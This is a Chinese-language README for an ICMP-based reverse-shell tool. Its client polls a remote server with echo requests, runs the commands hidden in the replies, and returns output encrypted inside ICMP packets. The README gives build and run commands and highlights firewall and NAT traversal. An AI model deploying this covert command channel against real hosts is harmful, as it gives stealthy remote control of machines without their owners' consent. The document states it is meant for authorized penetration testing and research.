# go-icmpshell-Ex

本项目为在原仓库基础上的二次开发版本，移除了对 `gopacket/pcap` 的依赖，采用纯 Go 的 `golang.org/x/net/icmp` 实现，支持在老旧 Linux 环境下通过 `CGO_ENABLED=0` 静态编译，无需额外依赖。

**核心特性：纯 Go 实现、NAT 穿透友好、跨平台（Linux/Windows/macOS）、协议头防护、大数据分片传输。**

## 🚀 主要特性

*   **纯 Go ICMP 收发**：弃用 libpcap，使用 `icmp.ListenPacket("ip4:icmp", "0.0.0.0")`，支持静态编译，无依赖运行。
*   **NAT 穿透友好**：采用 **Client 主动请求 (Echo Request) -> Server 被动响应 (Echo Reply)** 的通信模型。Server 仅在收到 Client 的心跳包时才下发命令，确保数据包能顺利穿透 NAT/防火墙。
*   **协议头防护**：引入 `CMD:` 和 `OUT:` 协议头，严格区分命令与输出，防止内核自动回复导致的“反射攻击”或死循环，同时解决 Token 不匹配时的垃圾数据执行问题。
*   **可靠的大数据传输**：实现了应用层分片（Fragmentation），自动将长命令（如上传脚本）或长输出（如 `cat` 大文件）切分为带有协议头的小块发送，解决了 MTU 限制导致的数据截断问题。
    > **说明**：原项目直接发送大数据包会导致被网络设备截断或丢弃（通常 MTU 为 1500，减去 IP 头和 ICMP 头后，安全 Payload 约为 1472 字节）。本项目考虑到不同网络环境的复杂性（如 VPN、隧道等可能导致 MTU 进一步减小），将分片阈值保守设定为 **1000 字节**，并为每个分片独立添加协议头和加密，以最大程度确保传输的稳定性和可用性。
*   **Windows 完美支持**：
    *   自动检测输出编码（GBK/UTF-8），解决中文乱码问题。
    *   支持 `--powershell` 模式，使用 PowerShell 执行更复杂的命令。
*   **安全增强**：修复了原版的弱加密逻辑，使用 Token 的 MD5 哈希作为密钥进行异或加密，确保不同 Token 的客户端与服务端无法互通。

## 🛠 构建

项目支持跨平台编译（Linux, Windows, macOS）。

**Linux (Server/Shell):**
```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o icmpshell-server-Ex ./cmd/server
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o icmpshell-shell-Ex ./cmd/shell
```

**Windows (Shell):**
```bash
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o icmpshell-shell-Ex.exe ./cmd/shell
```

**macOS (Shell):**
```bash
CGO_ENABLED=0 GOOS=darwin GOARCH=arm64 go build -o icmpshell-shell-mac-Ex ./cmd/shell
```

## 📖 使用说明

### 1. 服务端 (Server)

**注意：Server 端强烈建议运行在 Linux 环境下。**
> 虽然 Go 语言支持跨平台编译，但由于 Windows 和 macOS (Darwin) 的内核网络栈对原始套接字（Raw Socket）的入站 ICMP 流量有严格限制（如 macOS 不会将内核已处理的 Echo Request 副本传递给用户空间 Socket，Windows 防火墙和内核同样会拦截），导致在纯 Go (`net/icmp`) 实现下无法稳定接收 Client 的心跳包。因此，Server 端请务必部署在 Linux 主机或虚拟机上。

服务端需要 root 权限以监听 ICMP 流量。

**重要**：在运行 Server 前，建议禁用系统内核的 ICMP 响应，防止内核抢先回复 Client 的包导致通信干扰。
```bash
# 临时禁用内核 ICMP 回复
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

启动 Server：
```bash
sudo ./icmpshell-server --token <your_secret_token> [-logs]
```

### 2. 客户端 (Shell)

客户端需要 root/管理员权限以发送原始 ICMP 包。

#### Linux 免 sudo 运行（推荐）
可以通过 `setcap` 命令赋予二进制文件网络原始套接字权限，从而无需 root 运行：
```bash
sudo setcap cap_net_raw+ep ./icmpshell-shell
./icmpshell-shell --ip <server_ip> --token <token>
```

#### 常规运行
**Linux / macOS:**
```bash
sudo ./icmpshell-shell-Ex --ip <server_ip> --token <your_secret_token>
```

**Windows (CMD 模式 - 默认):**
```powershell
.\icmpshell-shell-Ex.exe --ip <server_ip> --token <your_secret_token>
```

**Windows (PowerShell 模式):**
```powershell
.\icmpshell-shell-Ex.exe --ip <server_ip> --token <your_secret_token> --powershell
```

### 参数详解
- `--token`：握手与加密认证 Token（Server 与 Shell 必须一致）。
- `--ip`：Server 的公网 IP 地址（Shell 必选）。
- `--icmpId`：指定 ICMP ID（可选，默认 1000，用于区分不同会话）。
- `--powershell`：(仅 Windows Shell) 使用 `powershell -Command` 而非 `cmd.exe /C` 执行命令。
- `-logs`：开启详细的 ICMP 收发日志（调试用）。

## 🧩 原理与协议

### 通信流程
1.  **握手**：Shell 启动后发送包含 Token 的 Echo Request。
2.  **心跳/轮询**：Shell 每 2 秒发送一个心跳包（Echo Request）。
3.  **命令下发**：Server 收到心跳包后，若队列中有待执行命令，则将命令加密并加上 `CMD:` 头，作为 Echo Reply 返回；若无命令，则返回加密的 Token 作为 KeepAlive。
4.  **结果回传**：Shell 执行命令后，将结果切片、加密并加上 `OUT:` 头，封装在 Echo Request 中发回 Server。Server 收到后解密并打印，同时回复 Echo Reply 确认（或下发新命令）。

### 安全机制
*   **Payload 加密**：`Data = XOR(RawData, MD5(Token))`。
*   **协议头检查**：
    *   Server 仅处理 `OUT:` 开头的包，忽略 `CMD:` 开头的反射包和无头垃圾包。
    *   Shell 仅执行 `CMD:` 开头的包，忽略 `OUT:` 开头的反射包和无头垃圾包。
    *   彻底杜绝了因网络环境（如内核自动回复）导致的数据回环死循环。

## ⚠️ 免责声明

本项目仅供网络安全学习、渗透测试授权演练及研究使用。请勿用于未授权的非法入侵，否则由此产生的一切法律后果均由使用者承担。

## 🙏 致谢

- 原项目地址：<https://github.com/d1nfinite/go-icmpshell>
- 感谢原作者提供的思路，本项目在此基础上进行了大量重构与增强。
